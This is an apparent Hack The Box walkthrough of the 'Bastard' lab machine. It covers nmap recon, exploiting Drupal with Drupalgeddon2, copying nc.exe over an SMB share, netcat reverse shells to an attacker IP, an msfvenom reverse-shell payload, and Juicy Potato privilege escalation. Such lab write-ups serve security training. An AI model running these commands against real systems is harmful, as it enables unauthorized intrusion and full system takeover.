# Bastard Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

``nmap -sC -sV -oA bastard 10.10.10.9 -T4``

``80/tcp    open  http    Microsoft IIS httpd 7.5``

``135/tcp   open  msrpc   Microsoft Windows RPC``

``49154/tcp open  msrpc   Microsoft Windows RPC``

# ${{\color{purple}Initial Foothold}}\ $

### I found a drupal installation :

![image](https://user-images.githubusercontent.com/123066149/222651004-4f57a881-a658-42b1-9971-eed3a3e336a9.png)

### And just after I found the version :

![image](https://user-images.githubusercontent.com/123066149/222651316-1a0c5c4c-72df-4617-a4a4-4b99ff7a49d5.png)

### After a little research on my exploit database :

![image](https://user-images.githubusercontent.com/123066149/222651599-021d5a98-9551-49a5-9dda-a5b8e4e49f2f.png)

### I used Drupalgeddon2 for the exploitation part :

https://github.com/dreadlocked/Drupalgeddon2

# ${{\color{purple}Exploitation}}\ $

### I met a problem during the execution it is necessary to install a ruby gem :

![image](https://user-images.githubusercontent.com/123066149/222652135-0d69f8e1-66bf-43a9-99b2-d1284cce2573.png)

``ruby drupalgeddon2.rb http://10.10.10.9``

![image](https://user-images.githubusercontent.com/123066149/222652407-c72044a9-a977-4103-80d7-0aa443c1b8d7.png)

![image](https://user-images.githubusercontent.com/123066149/222652670-508a49d3-2911-4db4-ad3b-932e7fc9c50a.png)

``/usr/bin/impacket-smbserver kali .``

``copy \\10.10.16.2\kali\nc.exe``

### Here I use nc to be able to execute commands because with the exploit I am blocked in the root of the web server.
### I tried powershell and cmd and it does not work with powershell.

``nc.exe 10.10.16.2 1234 -e powershell.exe``

``nc.exe 10.10.16.2 1234 -e cmd.exe``

# ${{\color{purple}Privilege Escalation}}\ $

``whoami /priv``

![image](https://user-images.githubusercontent.com/123066149/222653150-d960687b-fcc3-4815-ae6d-8fef5e7d11b8.png)

``Juicy_Potato_x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p whoami``

![image](https://user-images.githubusercontent.com/123066149/222653070-65967f13-6367-46e0-9706-88a7f4bc4fc8.png)

``mmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=8888 -f exe -o exploit.exe``

![image](https://user-images.githubusercontent.com/123066149/222653552-a4fc6dcc-3560-4202-a773-942dfcbf8786.png)

``Juicy_Potato_x86.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p C:\inetpub\drupal-7.54\exploit.exe``

![image](https://user-images.githubusercontent.com/123066149/222653326-a6bb088c-8984-4daa-8634-75fd0e114c60.png)

# ${{\color{purple}Points of Improvement}}\ $

* if I have a problem with the execution of an exploit in rubby

``gem install xx``

![image](https://user-images.githubusercontent.com/123066149/222652135-0d69f8e1-66bf-43a9-99b2-d1284cce2573.png)

* Other way :

![image](https://user-images.githubusercontent.com/123066149/222665701-0b747998-8481-4c25-a2ef-4e6a4a246310.png)


